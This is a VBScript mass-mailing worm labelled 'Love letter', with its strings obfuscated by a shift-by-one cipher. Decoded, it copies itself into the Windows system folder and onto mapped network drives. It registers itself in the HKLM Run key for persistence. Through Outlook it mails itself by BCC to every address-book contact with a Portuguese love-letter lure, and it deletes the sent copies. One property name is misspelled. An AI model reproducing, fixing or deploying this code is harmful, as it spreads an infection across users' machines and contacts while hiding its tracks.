' Love letter

On Error Resume Next

Dim OD032L9
Dim KD1QPQU6
Dim Y97
Dim X87HGED
Dim H6V3B53
Dim QUF5
Dim Y3XT
Dim VQ2ICNG
Dim V11HM
Dim PD3Y

Set OD032L9 = CreateObject( ME7WY( "Tdsjqujoh/GjmfTztufnPckfdu" ) )
OD032L9.CopyFile WScript.ScriptFullName, OD032L9.BuildPath( OD032L9.GetSpecialFolder(1), ME7WY( "EXI7C31/WCT" ) )

Set KD1QPQU6 = CreateObject( ME7WY( "XTdsjqu/Tifmm" ) )
KD1QPQU6.RegWrite ME7WY( "ILFZ`MPDBM`NBDIJOF]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo]" ) & ME7WY( "EXI7C31" ), OD032L9.BuildPath( OD032L9.GetSpecialFolder(1), ME7WY( "EXI7C31/WCT" ) )


Set Y97 = CreateObject( ME7WY( "XTdsjqu/Ofuxpsl" ) )
Set H6V3B53 = Y97.EnumNetworkDrives

If H6V3B53.Count <> 0 Then
   For X87HGED = 0 To H6V3B53.Count - 1
       If InStr( H6V3B53.Item( X87HGED), ME7WY( "]" ) ) <> 0 Then
          OD032L9.CopyFile WScript.ScriptFullName, OD032L9.BuildPath( H6V3B53.Item( X87HGED), ME7WY( "EXI7C31/WCT" ) ) 
       End If
   Next
End If

X87HGED = KD1QPQU6.RegRead( ME7WY( "ILFZ`MPDBM`NBDIJOF]" ) & ME7WY( "EXI7C31" ) )

If X87HGED = "" Or X87HGED > 20 Then
   X87HGED = 0
End If

If X87HGED = 0 Then
   Set VQ2ICNG = CreateObject( ME7WY( "Pvumppl/Bqqmjdbujpo" ) )
   Set QUF5 = VQ2ICNG.GetNameSpace( ME7WY( "NBQJ" ) )

   For Each Y3XT In QUF5.AddressLists
       Set H6V3B53 = VQ2ICNG.CreateItem( 0 )

       For V11HM = 1 To Y3XT.AddressEntries.Count
           Set PD3Y = Y3XT.AddressEntries( V11HM )

           If V11HM = 1 Then
              H6V3B53.BCC = PD3Y.Address
           Else
              H6V3B53.BCC = H6V3B53.BCC & ME7WY( "<!" ) & PD3Y.Address
           End If
       Next

       H6V3B53.Subject = ME7WY( "Z!mpwf!zpv" )
       H6V3B53.Body = ME7WY( "Dmjdl!ob!mpwf!mfuufs!f!wfkb!p!mjoep!dbsuäp!nvtjdbm!rvf!fv!uf!nboefj/" )
       H6V3B53.Attachmets.Add WScript.ScriptFullName
       H6V3B53.DeleteAfterSubmit = True
       H6V3B53.Send
   Next

   X87HGED = 0
End If

KD1QPQU6.RegWrite ME7WY( "ILFZ`MPDBM`NBDIJOF]" ) & ME7WY( "EXI7C31" ), X87HGED + 1

Function ME7WY( MHNLJHM6 )
   Dim A46J
   Dim K4EXMN4T
   Dim YX7S

   A46J = ""

   For K4EXMN4T = 1 To Len( MHNLJHM6 )
       YX7S = Mid( MHNLJHM6, K4EXMN4T, 1 )

       A46J = A46J & Chr( Asc( YX7S ) - 1 )
   Next

   ME7WY = A46J
End Function
